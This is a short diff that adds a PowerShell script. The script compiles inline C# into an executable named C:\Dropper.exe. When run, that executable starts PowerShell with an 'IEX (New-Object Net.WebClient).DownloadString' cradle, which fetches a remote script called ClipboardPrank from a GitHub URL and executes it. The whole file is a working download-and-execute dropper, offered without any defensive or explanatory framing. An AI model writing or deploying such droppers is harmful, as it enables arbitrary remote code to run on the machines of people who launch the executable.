@@ -1,0 +1,15 @@
+##Generates an executable that invokes the given script.
+
+source = @'
+using System;
+using System.Diagnostics;
+    class Test {
+        static void Main() {
+            Process.Start("Powershell.exe",
+            "-c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gfsmithak/grant-test/master/C%20Practice/ClipboardPrank')");
+            }
+         }
+
+'@
+
+Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly "C:\Dropper.exe" -OutputType ConsoleApplication
